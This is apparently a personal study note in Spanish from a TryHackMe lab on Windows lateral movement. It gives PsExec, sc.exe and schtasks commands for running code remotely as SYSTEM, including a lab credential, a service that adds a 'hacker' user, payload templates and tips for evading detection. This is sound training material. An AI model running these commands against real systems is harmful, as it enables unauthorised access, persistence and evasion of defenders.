---
tags: [red-team, lateral-movement, psexec, smb, services]
created: 2026-04-21
source: TryHackMe - Lateral Movement and Pivoting
related:
  - "[[Moving Through the Network]]"
  - "[[Moving Laterally Using WMI]]"
---
Ejecutar procesos en hosts remotos es una de las formas más directas de moverse lateralmente. Todas estas técnicas requieren credenciales de un usuario con permisos administrativos en la máquina destino.

---

## PsExec (Sysinternals)

`PsExec` se conecta al share `ADMIN$` vía SMB, sube un servicio temporal (`PSEXESVC`) y lo ejecuta como **SYSTEM**.

```shell
PsExec64.exe -i \\za.host.com cmd.exe
```

Con credenciales explícitas:

```shell
PsExec64.exe -i -u za.host.com\t1_leonard.summers -p Password01! 
\\za.host.com cmd.exe
```

> [!info] El flag `-i` permite interacción con el escritorio. `-s` fuerza ejecución como SYSTEM.

### Requisitos
- Puerto **445/TCP** accesible
- Share **ADMIN$** disponible
- Credenciales de administrador local o de dominio

---

## sc.exe (creación remota de servicios)

Permite crear e iniciar servicios en hosts remotos nativamente.

```shell
sc.exe \\TARGET create THMservice binPath= "net user hacker Passwd123 /add" start= auto
sc.exe \\TARGET start THMservice
```

> [!warning] Tiene que haber un **espacio después de cada `=`**.

---

## schtasks (tareas programadas remotas)

```shell
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask" /tr "<comando>" /sc ONCE /sd 01/01/2030 /st 00:00
schtasks /s TARGET /run /tn "THMtask"
schtasks /s TARGET /delete /tn "THMtask" /f
```

---

## Comandos Clave

```shell
PsExec64.exe -i -u DOMAIN\user -p pass \\HOST cmd.exe
sc.exe \\HOST create svc binPath= "cmd /c payload.exe" start= auto
schtasks /s HOST /create /tn task /tr payload.exe /sc ONCE /sd 01/01/2030 /st 00:00 /RU SYSTEM
```

---

## Detección / OPSEC

> [!warning] PsExec deja huellas muy claras:
> - **Event ID 7045** (service installation) en el target
> - Creación de archivo en `ADMIN$`
> - Servicio con nombre `PSEXESVC` por defecto

Para evadir defensas se suele renombrar el binario y el servicio, o sustituir PsExec por equivalentes como `PAExec`, `SMBExec` o WMI.

